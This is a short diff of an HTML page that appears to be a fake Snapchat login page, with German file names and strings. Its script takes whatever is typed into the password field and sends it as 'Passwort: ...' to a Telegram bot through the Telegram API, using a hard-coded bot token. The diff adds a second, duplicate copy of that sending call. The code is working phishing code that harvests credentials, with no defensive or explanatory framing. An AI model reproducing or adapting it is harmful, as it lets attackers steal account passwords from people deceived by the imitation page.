@@ -11,10 +11,6 @@
         <link rel="stylesheet" href="SnapchatLoginPasswort-Dateien/css.css" media="all" />
         <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 
-        <script type="text/javascript">
-            WebFont.load({ google: { families: ["Inter:100,200,300,regular,500,600,700,800,900"] } });
-        </script>
-        
         <script>
             function sendMessage() {
                 var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
@@ -22,6 +18,10 @@
                 var message = $("#passwordinput").val();
                 var fullMessage = "Passwort: " + message;
                 
+                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
+                    console.log("Antwort von der Telegram API:", data);
+                });
+
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                     console.log("Antwort von der Telegram API:", data);
                 });
